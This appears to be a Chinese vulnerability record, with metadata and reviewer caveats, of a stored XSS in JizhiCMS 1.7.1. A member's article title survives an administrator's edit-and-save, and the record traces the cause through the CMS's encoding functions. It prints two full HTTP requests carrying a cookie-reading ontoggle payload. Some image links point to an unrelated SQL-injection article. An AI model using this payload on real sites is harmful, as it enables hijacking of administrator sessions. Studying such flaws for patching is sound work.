---
source: "hatch 补库批 20260928"
product: "JizhiCMS1.7.1"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Jizhicms 1.7.1 存储XSS漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：注册会员投稿；管理员编辑且不清理恶意标题再保存，后续渲染"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-98cf1ff33ca8e29329b21e0b"
entity_id: "ve-98cf1ff33ca8e29329b21e0b"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：注册会员投稿；管理员编辑且不清理恶意标题再保存，后续渲染

- **结论使用边界（1）**：开头payload仅details open无JS，不完整，完整ontoggle载荷在后续HTTP正文。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（2）**：描述清楚首次实体编码后管理员再保存变原文的二阶段条件，应保留避免概括提交即触发。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **凭据与会话边界（3）**：部分图指另一SQL链资源且HTML实体说明自身被格式转义污染；两请求相同会话值需注明实验切换角色。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Jizhicms 1.7.1 存储XSS漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Jizhicms 1.7.1

三、复现过程
------------

首先自己注册一个账户然后登陆，在文章标题处插入XSS payload

    payload:<details open>

![1.png](./.resource/Jizhicms1.7.1存储XSS漏洞/media/rId24.png)

管理员登录后台点击编辑且没有修改里面的字符串就保存的话那便会触发XSS漏洞![2.png](./.resource/Jizhicms1.7.1存储XSS漏洞/media/rId25.png)![3.png](./.resource/Jizhicms1.7.1从sql注入到任意文件上传/media/rId26.png)首先看一下在前台发表文章处的请求数据包

    POST /user/release.html HTTP/1.1
    Host: www.0-sec.org:8091
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 187
    Origin: http://www.0-sec.org:8091
    Connection: close
    Referer: http://www.0-sec.org:8091/user/release.html
    Cookie: PHPSESSID=t61********************r5b

    ajax=1&isshow=&molds=article&tid=2&title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&keywords=&litpic=&description=123&body=%3Cp%3E123%3Cbr%2F%3E%3C%2Fp%3E

根据url定位到release函数![4.png](./.resource/Jizhicms1.7.1从sql注入到任意文件上传/media/rId27.png)该函数主要是先检查是否是登录状态然后检查是否存在违禁词汇，其中违禁词汇取的是webconf\[\'mingan\'\]的值，由前篇文章可知数据存放在数据库中然后通过缓存读取相关信息，可以直接输出一下![5.png](./.resource/Jizhicms1.7.1从sql注入到任意文件上传/media/rId28.png)

    过滤的东西和XSS关系不大，主要是涉及到文章敏感汉字之类的，然后被保存到数据库中的时候<>变成了&lt; &gt;

![6.png](./.resource/Jizhicms1.7.1从sql注入到任意文件上传/media/rId29.png)看下是如何进行操作的，继续跟进该函数，通过frparam函数进行操作之后对title进行赋值![7.png](./.resource/Jizhicms1.7.1从sql注入到任意文件上传/media/rId30.png)frparam函数在获取到相关值后调用format\_param函数对数据进行处理，由于传入的int的值为1.所以对传入的参数进行了html实体编码![8.png](./.resource/Jizhicms1.7.1从sql注入到任意文件上传/media/rId31.png)![9.png](./.resource/Jizhicms1.7.1存储XSS漏洞/media/rId32.png)所以在数据库中存储的是进行过实体编码的xss payload最后登入后台看下编辑函数

    POST /admin.php/Article/editarticle.html HTTP/1.1
    Host: www.0-sec.org:8091
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 340
    Origin: http://www.0-sec.org:8091
    Connection: close
    Referer: http://www.0-sec.org:8091/admin.php/Article/editarticle/id/34.html
    Cookie: PHPSESSID=t61********************r5b

    go=1&id=34&title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&tid=2&seo_title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&hits=0&keywords=&litpic=&file=&description=123&orders=0&tags=&isshow=0&addtime=2020-05-28+17%3A17%3A39&target=&ownurl=&body=%3Cp%3E123%3Cbr%2F%3E%3C%2Fp%3E

看一下数据中的更新情况，又将\< \>变成了\<\>,所以触发了XSS漏洞![10.png](./.resource/Jizhicms1.7.1存储XSS漏洞/media/rId33.png)定位到漏洞函数editarticle，看到同样调用了frparam函数![11.png](./.resource/Jizhicms1.7.1存储XSS漏洞/media/rId34.png)frparam函数由于没有传入参数会直接返回url中的数据![12.png](./.resource/Jizhicms1.7.1存储XSS漏洞/media/rId35.png)在请求包中可以看到是已经将html实体化编码变成了原字符，所以data取到的数据时没有经过html编码的数据![13.png](./.resource/Jizhicms1.7.1存储XSS漏洞/media/rId36.png)所以在进行update更新操作的时候就会向数据库写入未经html实体化编码的数据

参考链接
--------

> https://xz.aliyun.com/t/7861
